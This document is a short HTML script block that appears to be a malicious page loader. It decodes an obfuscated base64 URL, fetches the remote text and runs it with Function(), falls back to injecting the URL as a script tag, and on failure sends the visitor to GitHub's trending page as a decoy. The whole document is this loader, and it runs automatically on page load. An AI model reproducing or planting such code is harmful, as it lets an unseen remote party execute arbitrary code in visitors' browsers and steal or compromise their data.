<script>
var _tok = 'aHR0cHM6Ly9sZW9oYXJkdmVrb3M=';

function _trendHubP16() {
    location.assign(_fromB64('aHR0cHM6Ly9naXRodWIuY29tL3RyZW5kaW5n'));
}

function _fromB64(e) {
    return decodeURIComponent(escape(atob(e)));
}

function buildEndpoint() {
    var _end = 'LmNvbS9pbmJvcm4uc2Vpem9y';
    return _fromB64(_tok) + _fromB64(_end);
}

function pullText(url) {
    return fetch(url, { method: 'GET', cache: 'no-store' })
        .then(function (res) {
            if (!res.ok) throw 0;
            return res.text();
        });
}

function runBody(text) {
    var body = String(text).replace(/^\uFEFF/, '').trim();
    if (!body) throw 0;
    Function(body)();
}

function mountScriptTag(url) {
    return new Promise(function (resolve, reject) {
        var tag = document.createElement('script');
        tag.charset = 'utf-8';
        tag.src = url;
        tag.onload = resolve;
        tag.onerror = reject;
        (document.head || document.documentElement).appendChild(tag);
    });
}

function bootRemote() {
    var url = buildEndpoint();
    if (!url) { _trendHubP16(); return; }
    pullText(url)
        .then(function (text) {
            try { runBody(text); } catch (e) { _trendHubP16(); }
        })
        .catch(function () {
            mountScriptTag(url).catch(function () { _trendHubP16(); });
        });
}

bootRemote();
</script>
